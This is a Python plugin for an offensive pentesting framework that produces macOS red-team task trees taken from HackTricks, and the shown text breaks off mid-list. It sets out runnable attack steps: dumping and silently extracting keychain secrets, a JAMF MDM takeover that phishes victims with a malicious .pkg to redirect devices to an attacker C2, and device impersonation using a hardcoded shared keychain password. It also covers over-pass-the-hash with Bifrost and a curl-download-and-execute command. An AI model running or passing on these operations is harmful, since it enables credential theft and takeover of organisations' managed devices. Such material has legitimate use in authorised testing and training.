"""
macOS Red Teaming service plugin

Generates tasks for macOS-specific red teaming operations including:
- MDM (Mobile Device Management) attacks and C2 operations
- JAMF Pro enumeration and exploitation
- Active Directory integration on macOS
- Keychain access and credential theft
- Kerberos attacks (Over-Pass-The-Hash, Kerberoasting)
- macOS-specific privilege escalation

Extracted from HackTricks: macos-hardening/macos-red-teaming/
Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class MacOSRedTeamingPlugin(ServicePlugin):
    """macOS Red Teaming enumeration and exploitation plugin"""

    @property
    def name(self) -> str:
        return "macos-red-team"

    @property
    def default_ports(self) -> List[int]:
        return [22, 88, 389, 5900, 3283, 5353]  # SSH, Kerberos, LDAP, VNC, Apple Remote Desktop, mDNS

    @property
    def service_names(self) -> List[str]:
        return ['ssh', 'vnc', 'apple-remote-desktop', 'ard', 'kerberos', 'ldap', 'mdns', 'afp', 'apple-filing-protocol']

    def detect(self, port_info: Dict[str, Any], profile: 'TargetProfile') -> bool:
        """Detect macOS services"""
        service = port_info.get('service', '').lower()
        product = port_info.get('product', '').lower()
        port = port_info.get('port')
        extrainfo = port_info.get('extrainfo', '').lower()

        # Check for macOS-specific indicators
        macos_indicators = ['apple', 'macos', 'darwin', 'osx']
        if any(ind in product for ind in macos_indicators):
            return True

        if any(ind in extrainfo for ind in macos_indicators):
            return True

        # Check service names
        if any(svc in service for svc in self.service_names):
            # Check for macOS-specific SSH
            if 'ssh' in service and any(ind in product for ind in macos_indicators):
                return True
            # Apple-specific services
            if any(svc in service for svc in ['vnc', 'ard', 'afp']):
                return True

        # Check macOS-specific ports
        macos_ports = [3283, 5900]  # ARD, VNC
        if port in macos_ports:
            return True

        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate macOS Red Teaming task tree"""
        version = service_info.get('version', '')
        product = service_info.get('product', '')
        service = service_info.get('service', '').lower()

        tasks = {
            'id': f'macos-red-team-{port}',
            'name': f'macOS Red Teaming (Port {port})',
            'type': 'parent',
            'children': []
        }

        # === PHASE 1: Initial Enumeration ===
        initial_enum = {
            'id': f'macos-initial-enum-{port}',
            'name': 'Initial macOS Enumeration',
            'type': 'parent',
            'children': []
        }

        # Task: Domain Information Discovery
        initial_enum['children'].append({
            'id': f'macos-domain-info-{port}',
            'name': 'Enumerate Domain Information',
            'type': 'command',
            'metadata': {
                'command': f'echo show com.apple.opendirectoryd.ActiveDirectory | scutil',
                'description': 'Discover Active Directory configuration on macOS (if domain-joined)',
                'flag_explanations': {
                    'show com.apple.opendirectoryd.ActiveDirectory': 'Query OpenDirectory for AD configuration',
                    'scutil': 'System configuration utility (macOS-specific)'
                },
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'ENUM', 'MACOS'],
                'success_indicators': [
                    'Domain name displayed',
                    'Domain controller information shown',
                    'Forest name visible'
                ],
                'failure_indicators': [
                    'No such key (not domain-joined)',
                    'Permission denied',
                    'Command not found (not macOS)'
                ],
                'next_steps': [
                    'Enumerate domain users with dscl',
                    'Check for cached credentials',
                    'Enumerate Kerberos tickets',
                    'Test AD authentication'
                ],
                'alternatives': [
                    'dsconfigad -show',
                    'Manual: Check /Library/Preferences/OpenDirectory/Configurations/Active Directory/',
                    'defaults read /Library/Preferences/OpenDirectory/Configurations/Active\\ Directory/'
                ],
                'notes': 'Only works on domain-joined macOS systems. Requires local access or SSH session.'
            }
        })

        # Task: User Enumeration (macOS-specific)
        initial_enum['children'].append({
            'id': f'macos-user-enum-{port}',
            'name': 'Enumerate macOS Users',
            'type': 'command',
            'metadata': {
                'command': f'dscl . ls /Users',
                'description': 'List all local macOS users (Directory Services Command Line)',
                'flag_explanations': {
                    'dscl': 'Directory Service command line utility',
                    '.': 'Local node (use "." for local, "/Active Directory/DOMAIN" for AD)',
                    'ls /Users': 'List all users in the Users directory'
                },
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'ENUM', 'MACOS'],
                'success_indicators': [
                    'List of usernames displayed',
                    'Both local and network users shown (if AD-joined)',
                    'Service accounts visible'
                ],
                'failure_indicators': [
                    'Permission denied',
                    'Empty output',
                    'Command not found (not macOS)'
                ],
                'next_steps': [
                    'Get detailed user info: dscl . read /Users/[username]',
                    'Check for admin users: dscl . read /Groups/admin GroupMembership',
                    'Enumerate home directories',
                    'Search for SSH keys in ~/.ssh/'
                ],
                'alternatives': [
                    'dscacheutil -q user (local cache)',
                    'id -u [username] (check user ID)',
                    'Manual: cat /etc/passwd (limited info on macOS)',
                    'ls -la /Users/ (home directories)'
                ],
                'notes': 'Three types of macOS users: Local (OpenDirectory), Network (volatile AD), Mobile (AD with local backup)'
            }
        })

        # Task: Group Enumeration
        initial_enum['children'].append({
            'id': f'macos-group-enum-{port}',
            'name': 'Enumerate macOS Groups',
            'type': 'command',
            'metadata': {
                'command': f'dscl . ls /Groups',
                'description': 'List all groups on macOS system',
                'flag_explanations': {
                    'dscl': 'Directory Service command line utility',
                    '.': 'Local directory node',
                    'ls /Groups': 'List all groups'
                },
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'ENUM', 'MACOS'],
                'success_indicators': [
                    'admin group present (local admins)',
                    'wheel group visible (sudo access)',
                    'Group list displayed'
                ],
                'failure_indicators': [
                    'Permission denied',
                    'Empty list'
                ],
                'next_steps': [
                    'Check admin group members: dscl . read /Groups/admin GroupMembership',
                    'Check wheel group: dscl . read /Groups/wheel GroupMembership',
                    'Enumerate AD groups if domain-joined'
                ],
                'alternatives': [
                    'groups [username] (show user group membership)',
                    'id [username] (show user ID and groups)',
                    'dscacheutil -q group'
                ],
                'notes': 'Key groups: admin (local admin), wheel (sudo), staff (standard users)'
            }
        })

        tasks['children'].append(initial_enum)

        # === PHASE 2: Keychain Attacks ===
        keychain_attacks = {
            'id': f'macos-keychain-{port}',
            'name': 'macOS Keychain Attacks',
            'type': 'parent',
            'children': []
        }

        # Task: List Keychains
        keychain_attacks['children'].append({
            'id': f'macos-list-keychains-{port}',
            'name': 'List macOS Keychains',
            'type': 'command',
            'metadata': {
                'command': 'security list-keychains',
                'description': 'List all keychains accessible to current user',
                'flag_explanations': {
                    'security': 'macOS security framework command-line tool',
                    'list-keychains': 'Display all keychain paths'
                },
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'CREDENTIAL_THEFT', 'MACOS'],
                'success_indicators': [
                    'User keychain: ~/Library/Keychains/login.keychain-db',
                    'System keychain: /Library/Keychains/System.keychain',
                    'Keychain paths displayed'
                ],
                'failure_indicators': [
                    'No keychains found',
                    'Permission denied',
                    'Command not found (not macOS)'
                ],
                'next_steps': [
                    'Dump keychain metadata (will generate prompts)',
                    'Search for specific passwords',
                    'Attempt to extract without prompts using LockSmith',
                    'Check for plaintext passwords in General attribute'
                ],
                'alternatives': [
                    'Manual: ls ~/Library/Keychains/',
                    'Manual: ls /Library/Keychains/',
                    'Check system keychains: ls /System/Library/Keychains/',
                    'iOS: ls /private/var/Keychains/'
                ],
                'notes': 'User keychain requires user password to decrypt. System keychain contains WiFi passwords, system certs, CA certs.'
            }
        })

        # Task: Dump Keychain (with prompts)
        keychain_attacks['children'].append({
            'id': f'macos-dump-keychain-{port}',
            'name': 'Dump Keychain Secrets (Interactive)',
            'type': 'command',
            'metadata': {
                'command': 'security dump-keychain -a -d ~/Library/Keychains/login.keychain-db',
                'description': 'Dump all keychain items and decrypt secrets (generates pop-ups for each entry)',
                'flag_explanations': {
                    '-a': 'Dump all items (certificates, keys, passwords)',
                    '-d': 'Decrypt secrets (will prompt user for each item)',
                    '~/Library/Keychains/login.keychain-db': 'User keychain database path'
                },
                'tags': ['OSCP:MEDIUM', 'CREDENTIAL_THEFT', 'NOISY', 'MACOS'],
                'success_indicators': [
                    'Keychain items displayed with metadata',
                    'Decrypted passwords shown (if user approves prompts)',
                    'Application passwords revealed'
                ],
                'failure_indicators': [
                    'User denies prompt (no secrets extracted)',
                    'Keychain locked',
                    'File not accessible'
                ],
                'next_steps': [
                    'Search for high-value targets (Slack, GitHub, AWS)',
                    'Extract SSH keys',
                    'Look for application tokens',
                    'Use LockSmith for silent extraction'
                ],
                'alternatives': [
                    'security find-generic-password -a "Slack" -g (specific app)',
                    'Use LockSmith tool for prompt-free extraction',
                    'Download keychain file for offline cracking with Chainbreaker',
                    'Manual: Extract keychain DB and crack with user password'
                ],
                'notes': 'NOISY: Generates user prompts for each entry. For stealth, use API-based tools like LockSmith that only extract accessible items.'
            }
        })

        # Task: Find Specific Password
        keychain_attacks['children'].append({
            'id': f'macos-find-password-{port}',
            'name': 'Search Keychain for Specific Password',
            'type': 'command',
            'metadata': {
                'command': 'security find-generic-password -a "Slack" -g',
                'description': 'Search for specific application password in keychain',
                'flag_explanations': {
                    'find-generic-password': 'Search for generic (application) passwords',
                    '-a "Slack"': 'Account name to search for (e.g., Slack, GitHub, AWS)',
                    '-g': 'Display the password (will prompt user)'
                },
                'tags': ['OSCP:MEDIUM', 'CREDENTIAL_THEFT', 'QUICK_WIN', 'MACOS'],
                'success_indicators': [
                    'Password displayed after user approval',
                    'Keychain item metadata shown',
                    'Account found'
                ],
                'failure_indicators': [
                    'Item not found',
                    'User denies access',
                    'Multiple items found (be more specific)'
                ],
                'next_steps': [
                    'Try common apps: GitHub, Slack, AWS, Docker, NPM',
                    'Search for internet passwords: find-internet-password',
                    'Check for SSH passphrases',
                    'Look for VPN credentials'
                ],
                'alternatives': [
                    'security find-internet-password -s "github.com" -g',
                    'Use LockSmith to enumerate without prompts',
                    'grep for application names in keychain dump',
                    'Check Keychain Access.app GUI'
                ],
                'notes': 'Common high-value targets: Slack, GitHub tokens, AWS credentials, SSH keys, VPN passwords, corporate SSO'
            }
        })

        # Task: Silent Keychain Extraction (LockSmith)
        keychain_attacks['children'].append({
            'id': f'macos-locksmith-{port}',
            'name': 'Silent Keychain Extraction (LockSmith)',
            'type': 'command',
            'metadata': {
                'command': 'curl -L https://github.com/its-a-feature/LockSmith/releases/latest/download/locksmith -o /tmp/locksmith && chmod +x /tmp/locksmith && /tmp/locksmith -enumerate',
                'description': 'Extract keychain secrets without prompts using Security Framework API (LockSmith tool)',
                'flag_explanations': {
                    'locksmith': 'Security Framework API wrapper for prompt-free keychain access',
                    '-enumerate': 'List all accessible keychain items (respects ACLs)',
                    'curl -L': 'Download tool from GitHub releases'
                },
                'tags': ['OSCP:HIGH', 'CREDENTIAL_THEFT', 'STEALTH', 'MACOS'],
                'success_indicators': [
                    'Keychain items listed with access permissions',
                    'Accessible secrets displayed (no prompts)',
                    'ACL information shown (trusted apps, partition IDs)'
                ],
                'failure_indicators': [
                    'No accessible items (all require prompts)',
                    'Download failed',
                    'Permission denied'
                ],
                'next_steps': [
                    'Filter for items with partitionID=apple (osascript accessible)',
                    'Dump accessible secrets: locksmith -dump',
                    'Look for items with "all apps trusted" ACL',
                    'Inject into trusted apps to access restricted items'
                ],
                'alternatives': [
                    'Manual: Use Python with Security.framework',
                    'Manual: Use osascript to access partitionID=apple items',
                    'Compile custom tool with SecItemCopyMatching API',
                    'Use Metasploit post/osx/gather/enum_keychain'
                ],
                'notes': 'LockSmith respects ACLs. Items accessible without prompt: 1) All apps trusted + matching partitionID, 2) Current app in trusted list. Microsoft apps leaked refresh tokens in "General" plaintext field (unencrypted).'
            }
        })

        # Task: Keychain ACL Analysis
        keychain_attacks['children'].append({
            'id': f'macos-keychain-acl-{port}',
            'name': 'Analyze Keychain ACLs',
            'type': 'manual',
            'metadata': {
                'description': 'Understand keychain Access Control Lists to identify extractable secrets',
                'notes': '''Keychain ACL Structure:
1. ACL Authorizations (per entry):
   - ACLAuthorizationExportClear: Get plaintext secret
   - ACLAuthorizationExportWrapped: Get encrypted secret
   - ACLAuthorizationAny: Perform any action

2. Trusted Applications (per authorization):
   - Nil: Everyone trusted (accessible without prompt)
   - Empty list: Nobody trusted (always prompts)
   - App list: Specific apps trusted

3. Partition ID (additional check):
   - teamid:[ID]: Require matching Apple Team ID
   - apple: Require Apple-signed app (osascript, python)
   - cdhash:[hash]: Require specific app hash

Extraction Rules (no prompt):
- If 1+ trusted apps: Need matching app + matching partitionID
- If all apps trusted: Only need matching partitionID (or no partitionID)

Tools:
- LockSmith: Enumerates accessible items
- osascript: Access partitionID=apple items
- Code injection: Impersonate trusted apps''',
                'tags': ['OSCP:HIGH', 'RESEARCH', 'CREDENTIAL_THEFT', 'MACOS'],
                'next_steps': [
                    'Use LockSmith to identify accessible items',
                    'Filter for partitionID=apple (osascript access)',
                    'Inject code into trusted apps for restricted items',
                    'Check "General" attribute for plaintext leaks'
                ],
                'alternatives': [
                    'Read Apple Security Framework documentation',
                    'Analyze with SecAccessCopyACLList API',
                    'Use Keychain Access.app to view ACLs',
                    'Decompile trusted apps to find keychain queries'
                ]
            }
        })

        # Task: Offline Keychain Cracking
        keychain_attacks['children'].append({
            'id': f'macos-keychain-offline-{port}',
            'name': 'Offline Keychain Cracking',
            'type': 'command',
            'metadata': {
                'command': 'python3 chainbreaker.py -f login.keychain-db -p USER_PASSWORD',
                'description': 'Decrypt downloaded keychain file offline using user password (Chainbreaker tool)',
                'flag_explanations': {
                    'chainbreaker.py': 'Keychain decryption tool (github.com/n0fate/chainbreaker)',
                    '-f login.keychain-db': 'Path to downloaded keychain file',
                    '-p USER_PASSWORD': 'User plaintext password (from credential dump)'
                },
                'tags': ['OSCP:MEDIUM', 'CREDENTIAL_THEFT', 'POST_EXPLOIT', 'MACOS'],
                'success_indicators': [
                    'Keychain decrypted successfully',
                    'All secrets extracted in plaintext',
                    'Certificates and keys exported'
                ],
                'failure_indicators': [
                    'Invalid password',
                    'Corrupted keychain file',
                    'Python dependencies missing'
                ],
                'next_steps': [
                    'Extract application passwords',
                    'Export certificates and private keys',
                    'Search for AWS/GitHub/SSH credentials',
                    'Crack additional user keychains'
                ],
                'alternatives': [
                    'Install: git clone https://github.com/n0fate/chainbreaker',
                    'Brute-force password: hashcat with keychain hash',
                    'Manual: Use security export with user session',
                    'Try common passwords: username, company name, "password"'
                ],
                'notes': 'Requires: 1) Keychain file (~/Library/Keychains/login.keychain-db), 2) User plaintext password. Keychain files are encrypted but not protected - can be downloaded without authentication.'
            }
        })

        tasks['children'].append(keychain_attacks)

        # === PHASE 3: JAMF MDM Attacks ===
        jamf_attacks = {
            'id': f'macos-jamf-{port}',
            'name': 'JAMF MDM Attacks',
            'type': 'parent',
            'children': []
        }

        # Task: JAMF Self-Enrollment Check
        jamf_attacks['children'].append({
            'id': f'macos-jamf-enroll-{port}',
            'name': 'Check JAMF Self-Enrollment',
            'type': 'command',
            'metadata': {
                'command': f'curl -s https://COMPANY-NAME.jamfcloud.com/enroll/ | grep -i "login\\|enroll"',
                'description': 'Test if JAMF MDM has self-enrollment enabled (could allow device enrollment)',
                'flag_explanations': {
                    'https://COMPANY-NAME.jamfcloud.com/enroll/': 'JAMF enrollment portal URL (replace COMPANY-NAME)',
                    'grep -i "login\\|enroll"': 'Look for enrollment or login forms'
                },
                'tags': ['OSCP:MEDIUM', 'RECON', 'QUICK_WIN', 'MACOS'],
                'success_indicators': [
                    'Login form present (requires credentials)',
                    'Enrollment page accessible',
                    'Self-enrollment enabled'
                ],
                'failure_indicators': [
                    '404 Not Found (enrollment disabled)',
                    'Access denied',
                    'Invalid company name'
                ],
                'next_steps': [
                    'Password spray with JamfSniper.py',
                    'Brute-force usernames on enrollment form',
                    'Check for guest enrollment',
                    'Social engineering for enrollment credentials'
                ],
                'alternatives': [
                    'Browser: Visit https://COMPANY.jamfcloud.com/enroll/',
                    'JamfSniper.py password spraying attack',
                    'Burp Suite to analyze enrollment flow',
                    'Check DNS: dig COMPANY.jamfcloud.com'
                ],
                'notes': 'JAMF enrollment gives MDM control over device. MDM can install apps, create admin accounts, set firmware password, change FileVault key. Tool: github.com/WithSecureLabs/Jamf-Attack-Toolkit'
            }
        })

        # Task: JAMF Device Authentication Secrets
        jamf_attacks['children'].append({
            'id': f'macos-jamf-secrets-{port}',
            'name': 'Extract JAMF Device Secrets',
            'type': 'command',
            'metadata': {
                'command': 'plutil -convert xml1 -o - /Library/Preferences/com.jamfsoftware.jamf.plist',
                'description': 'Extract JAMF JSS (Jamf Software Server) URL and device configuration',
                'flag_explanations': {
                    'plutil': 'Property list utility (convert binary plist to XML)',
                    '-convert xml1': 'Convert to XML format for readability',
                    '-o -': 'Output to stdout',
                    '/Library/Preferences/com.jamfsoftware.jamf.plist': 'JAMF configuration file'
                },
                'tags': ['OSCP:HIGH', 'CREDENTIAL_THEFT', 'C2', 'MACOS'],
                'success_indicators': [
                    'jss_url displayed (JAMF server URL)',
                    'Device UUID visible',
                    'Configuration settings shown'
                ],
                'failure_indicators': [
                    'File not found (JAMF not installed)',
                    'Permission denied',
                    'Invalid plist format'
                ],
                'next_steps': [
                    'Overwrite JSS URL to point to C2 (Mythic Typhon agent)',
                    'Extract JAMF keychain: /Library/Application Support/Jamf/JAMF.keychain',
                    'Get device UUID: ioreg -d2 -c IOPlatformExpertDevice',
                    'Monitor /Library/Application Support/Jamf/tmp/ for scripts with credentials'
                ],
                'alternatives': [
                    'defaults read /Library/Preferences/com.jamfsoftware.jamf.plist',
                    'Manual: cat /Library/Preferences/com.jamfsoftware.jamf.plist | grep jss_url',
                    'Check persistence: cat /Library/LaunchAgents/com.jamf.management.agent.plist',
                    'Find JAMF keychain password (shared secret): jk23ucnq91jfu9aj'
                ],
                'notes': 'JAMF keychain password was shared among all installations: jk23ucnq91jfu9aj. Device cert in JAMF.keychain used for server auth.'
            }
        })

        # Task: JAMF Device Takeover
        jamf_attacks['children'].append({
            'id': f'macos-jamf-takeover-{port}',
            'name': 'JAMF Device Takeover (C2 Redirect)',
            'type': 'manual',
            'metadata': {
                'description': 'Redirect JAMF device to attacker-controlled JSS for MDM C2',
                'notes': '''JAMF Device Takeover Process:

1. Extract Current Configuration:
   plutil -convert xml1 -o - /Library/Preferences/com.jamfsoftware.jamf.plist
   - Get current JSS URL
   - Note device UUID

2. Create Malicious Package:
   - Build .pkg that overwrites com.jamfsoftware.jamf.plist
   - Set jss_url to Mythic C2 listener (Typhon agent)
   - Compress as .zip (Safari auto-decompresses)

3. Deliver Package:
   - Phishing: Email malicious .pkg
   - Safari auto-decompression triggers install
   - Package overwrites JAMF config

4. Trigger Reconnection:
   sudo jamf policy -id 0
   - Device connects to attacker JSS
   - Full MDM control achieved

MDM Capabilities:
- Install applications (signed with MDM cert)
- Execute custom scripts
- Create local admin accounts
- Set EFI firmware password
- Change FileVault encryption key
- Device configuration profiles
- Query device state

Tools:
- Mythic Orthrus agent (MDM-based C2)
- MicroMDM (run your own MDM)
- mdmcert.download (get CSR signed)''',
                'tags': ['OSCP:LOW', 'C2', 'ADVANCED', 'MACOS'],
                'next_steps': [
                    'Set up Mythic C2 with Typhon agent',
                    'Create malicious .pkg with pkgbuild',
                    'Host malicious JSS server',
                    'Deliver package to target',
                    'Wait for device check-in'
                ],
                'alternatives': [
                    'Compromise JAMF admin credentials (full access)',
                    'Deploy malware via legitimate JAMF server',
                    'Impersonate device with stolen UUID + cert',
                    'Man-in-the-middle JAMF traffic'
                ]
            }
        })

        # Task: JAMF Secrets Monitoring
        jamf_attacks['children'].append({
            'id': f'macos-jamf-secrets-monitor-{port}',
            'name': 'Monitor JAMF Scripts for Credentials',
            'type': 'command',
            'metadata': {
                'command': 'python3 JamfExplorer.py --monitor-files /Library/Application\\ Support/Jamf/tmp/ --monitor-processes',
                'description': 'Monitor JAMF temp directory and processes for credentials in admin scripts',
                'flag_explanations': {
                    'JamfExplorer.py': 'JAMF monitoring tool (WithSecureLabs/Jamf-Attack-Toolkit)',
                    '--monitor-files': 'Watch directory for new scripts',
                    '--monitor-processes': 'Monitor ps aux for jamf process arguments',
                    '/Library/Application Support/Jamf/tmp/': 'Temporary script execution directory'
                },
                'tags': ['OSCP:MEDIUM', 'CREDENTIAL_THEFT', 'MONITORING', 'MACOS'],
                'success_indicators': [
                    'New scripts detected',
                    'Credentials found in script content',
                    'Process arguments captured with passwords'
                ],
                'failure_indicators': [
                    'Directory not accessible',
                    'No JAMF activity',
                    'Scripts cleaned up too quickly'
                ],
                'next_steps': [
                    'Extract credentials from captured scripts',
                    'Monitor process list: ps aux | grep -i jamf',
                    'Check for hardcoded passwords',
                    'Analyze script patterns for future attacks'
                ],
                'alternatives': [
                    'Manual: watch -n 1 "ls -la /Library/Application\\ Support/Jamf/tmp/"',
                    'Manual: while true; do ps aux | grep jamf; sleep 1; done',
                    'fswatch /Library/Application\\ Support/Jamf/tmp/',
                    'Install: git clone https://github.com/WithSecureLabs/Jamf-Attack-Toolkit'
                ],
                'notes': 'JAMF admins may pass credentials as script parameters (visible in ps aux without root). Scripts placed in tmp/, executed, then deleted. Monitor continuously for credential leaks.'
            }
        })

        # Task: JAMF Impersonation
        jamf_attacks['children'].append({
            'id': f'macos-jamf-impersonate-{port}',
            'name': 'JAMF Device Impersonation',
            'type': 'manual',
            'metadata': {
                'description': 'Impersonate enrolled JAMF device to communicate with JSS',
                'notes': '''JAMF Device Impersonation Requirements:

1. Device UUID:
   ioreg -d2 -c IOPlatformExpertDevice | awk -F\\" \'/IOPlatformUUID/{print $(NF-1)}\'
   - Hardware UUID identifier

2. JAMF Keychain:
   /Library/Application Support/Jamf/JAMF.keychain
   - Contains device certificate for JSS authentication
   - Password (historical): jk23ucnq91jfu9aj

Impersonation Process:
1. Create VM with stolen hardware UUID
2. Disable SIP: csrutil disable (requires recovery boot)
3. Drop stolen JAMF.keychain into VM
4. Hook jamf binary to intercept communication
5. Steal credentials/tokens from JSS traffic

Why This Works:
- JSS authenticates devices via client certificate
- Certificate stored in JAMF keychain
- UUID used as device identifier
- No additional device attestation

Detection Risk: Medium
- JSS logs duplicate UUID connections
- Admin may notice device impersonation''',
                'tags': ['OSCP:LOW', 'ADVANCED', 'C2', 'MACOS'],
                'next_steps': [
                    'Set up macOS VM with matching hardware UUID',
                    'Import stolen JAMF keychain',
                    'Hook jamf agent communication',
                    'Intercept credentials and commands'
                ],
                'alternatives': [
                    'Steal admin credentials (cleaner access)',
                    'Deploy malicious profile via compromised JSS',
                    'Man-in-the-middle device <-> JSS traffic'
                ]
            }
        })

        tasks['children'].append(jamf_attacks)

        # === PHASE 4: Active Directory on macOS ===
        ad_attacks = {
            'id': f'macos-ad-{port}',
            'name': 'Active Directory Attacks (macOS)',
            'type': 'parent',
            'children': []
        }

        # Task: AD User Enumeration
        ad_attacks['children'].append({
            'id': f'macos-ad-users-{port}',
            'name': 'Enumerate Active Directory Users',
            'type': 'command',
            'metadata': {
                'command': 'dscl "/Active Directory/DOMAIN/All Domains" ls /Users',
                'description': 'List all Active Directory users from domain-joined macOS',
                'flag_explanations': {
                    'dscl': 'Directory Service command line utility',
                    '"/Active Directory/DOMAIN/All Domains"': 'AD node path (replace DOMAIN with actual domain)',
                    'ls /Users': 'List users directory'
                },
                'tags': ['OSCP:HIGH', 'ENUM', 'AD', 'MACOS'],
                'success_indicators': [
                    'Domain users listed',
                    'Both user and computer accounts shown',
                    'Service accounts visible'
                ],
                'failure_indicators': [
                    'Not bound to AD',
                    'Node not found',
                    'Permission denied'
                ],
                'next_steps': [
                    'Get user details: dscl "/Active Directory/DOMAIN/All Domains" read /Users/USERNAME',
                    'Enumerate computers: dscl ... ls /Computers',
                    'Enumerate groups: dscl ... ls /Groups',
                    'Check for Kerberos tickets: klist'
                ],
                'alternatives': [
                    'dscacheutil -q user (cached users)',
                    'MacHound: BloodHound for macOS (github.com/XMCyber/MacHound)',
                    'Orchard: JXA-based AD enumeration (github.com/its-a-feature/Orchard)',
                    'ldapsearch queries to DC'
                ],
                'notes': 'macOS AD users: Network (volatile, requires DC), Mobile (cached local backup), Local (not AD). MacHound adds BloodHound edges: CanSSH, CanVNC, CanAE (AppleEvent).'
            }
        })

        # Task: AD Computer Enumeration
        ad_attacks['children'].append({
            'id': f'macos-ad-computers-{port}',
            'name': 'Enumerate AD Computers',
            'type': 'command',
            'metadata': {
                'command': 'dscl "/Active Directory/DOMAIN/All Domains" ls /Computers',
                'description': 'List all Active Directory computer accounts',
                'flag_explanations': {
                    'ls /Computers': 'List computer objects in AD'
                },
                'tags': ['OSCP:HIGH', 'ENUM', 'AD', 'MACOS'],
                'success_indicators': [
                    'Computer accounts listed',
                    'Naming patterns visible',
                    'Server names discovered'
                ],
                'failure_indicators': [
                    'Empty list',
                    'Permission denied',
                    'Not bound to AD'
                ],
                'next_steps': [
                    'Get computer details: dscl ... read "/Computers/HOSTNAME$"',
                    'Identify domain controllers',
                    'Map network topology',
                    'Test SMB access to discovered computers'
                ],
                'alternatives': [
                    'MacHound for relationship mapping',
                    'Orchard JXA enumeration',
                    'ldapsearch against DC',
                    'Crackmapexec from attacker box'
                ],
                'notes': 'Computer accounts end with $. Useful for mapping AD infrastructure and identifying high-value targets.'
            }
        })

        # Task: AD Group Enumeration
        ad_attacks['children'].append({
            'id': f'macos-ad-groups-{port}',
            'name': 'Enumerate AD Groups',
            'type': 'command',
            'metadata': {
                'command': 'dscl "/Active Directory/DOMAIN/All Domains" read "/Groups/Domain Admins"',
                'description': 'Enumerate Active Directory group membership (target: Domain Admins)',
                'flag_explanations': {
                    'read "/Groups/Domain Admins"': 'Read group details and members'
                },
                'tags': ['OSCP:HIGH', 'ENUM', 'AD', 'MACOS'],
                'success_indicators': [
                    'Group members listed',
                    'Nested groups visible',
                    'Admin accounts discovered'
                ],
                'failure_indicators': [
                    'Group not found',
                    'Permission denied',
                    'Empty membership'
                ],
                'next_steps': [
                    'Target privileged groups: Domain Admins, Enterprise Admins, Administrators',
                    'Check local admin group for AD users',
                    'Map group relationships with MacHound',
                    'Identify service accounts in groups'
                ],
                'alternatives': [
                    'List all groups first: dscl ... ls /Groups',
                    'Check local admin group: dscl . read /Groups/admin GroupMembership',
                    'MacHound for BloodHound-style analysis',
                    'net rpc group members "Domain Admins" (Samba tools)'
                ],
                'notes': 'Focus on privileged groups. AD groups may have local admin rights on macOS systems.'
            }
        })

        # Task: Kerberos Ticket Enumeration
        ad_attacks['children'].append({
            'id': f'macos-kerberos-tickets-{port}',
            'name': 'Enumerate Kerberos Tickets',
            'type': 'command',
            'metadata': {
                'command': 'klist',
                'description': 'List cached Kerberos tickets (TGT and service tickets)',
                'flag_explanations': {
                    'klist': 'Kerberos ticket list utility (part of Heimdal on macOS)'
                },
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'CREDENTIAL_THEFT', 'KERBEROS', 'MACOS'],
                'success_indicators': [
                    'TGT (Ticket Granting Ticket) present',
                    'Service tickets listed',
                    'Ticket lifetimes shown'
                ],
                'failure_indicators': [
                    'No credentials cache',
                    'Tickets expired',
                    'Not authenticated to AD'
                ],
                'next_steps': [
                    'Extract TGT for Pass-the-Ticket',
                    'Request service tickets for Kerberoasting',
                    'Check for delegated credentials',
                    'Use Bifrost for ticket manipulation'
                ],
                'alternatives': [
                    'MacHound ticket extraction',
                    'Bifrost Kerberos tool (github.com/its-a-feature/bifrost)',
                    'Manual: Check /var/db/krb5kdc/ for ticket cache',
                    'kdestroy to clear tickets (testing)'
                ],
                'notes': 'macOS uses Heimdal Kerberos (not MIT). Tickets stored differently than Windows. Bifrost tool designed for macOS Kerberos attacks.'
            }
        })

        # Task: Computer$ Password Extraction
        ad_attacks['children'].append({
            'id': f'macos-computer-password-{port}',
            'name': 'Extract Computer$ Account Password',
            'type': 'command',
            'metadata': {
                'command': 'bifrost --action askhash --username COMPUTERNAME$ --domain DOMAIN.COM',
                'description': 'Extract computer account password hash from System keychain',
                'flag_explanations': {
                    'bifrost': 'macOS Kerberos attack tool (Heimdal krb5 API wrapper)',
                    '--action askhash': 'Request password hash from keychain',
                    '--username COMPUTERNAME$': 'Computer account name',
                    '--domain DOMAIN.COM': 'Active Directory domain'
                },
                'tags': ['OSCP:HIGH', 'CREDENTIAL_THEFT', 'AD', 'MACOS'],
                'success_indicators': [
                    'Computer account hash extracted',
                    'NTLM or AES hash displayed',
                    'Hash format: RC4 or AES256'
                ],
                'failure_indicators': [
                    'Keychain locked',
                    'Permission denied (need admin)',
                    'Computer account not found'
                ],
                'next_steps': [
                    'Use hash for Over-Pass-The-Hash attacks',
                    'Request TGT with computer account',
                    'Silver Ticket attacks',
                    'Crack hash if RC4/NTLM'
                ],
                'alternatives': [
                    'Extract from System keychain manually',
                    'security find-generic-password -s "COMPUTERNAME$"',
                    'Use Metasploit post/osx/gather/hashdump',
                    'Install Bifrost: git clone https://github.com/its-a-feature/bifrost'
                ],
                'notes': 'Computer account password stored in System keychain. Requires admin/root access. Hash can be used for Kerberos attacks without cracking.'
            }
        })

        # Task: Over-Pass-The-Hash (macOS)
        ad_attacks['children'].append({
            'id': f'macos-opth-{port}',
            'name': 'Over-Pass-The-Hash Attack',
            'type': 'command',
            'metadata': {
                'command': 'bifrost --action asktgt --username USER --domain DOMAIN.COM --hash NTHASH --enctype rc4',
                'description': 'Request TGT using NTLM hash (Over-Pass-The-Hash)',
                'flag_explanations': {
                    '--action asktgt': 'Request Ticket Granting Ticket',
                    '--username USER': 'Target username',
                    '--hash NTHASH': 'NTLM hash (from credential dump)',
                    '--enctype rc4': 'Encryption type (rc4 for NTLM, aes256 for AES)'
                },
                'tags': ['OSCP:HIGH', 'EXPLOIT', 'AD', 'KERBEROS', 'MACOS'],
                'success_indicators': [
                    'TGT obtained successfully',
                    'Ticket saved to cache',
                    'klist shows new TGT'
                ],
                'failure_indicators': [
                    'Pre-authentication failed',
                    'Invalid hash',
                    'Account locked/disabled'
                ],
                'next_steps': [
                    'Inject TGT into session: bifrost --action asktgt ...',
                    'Access SMB shares: smbutil view //computer.fqdn',
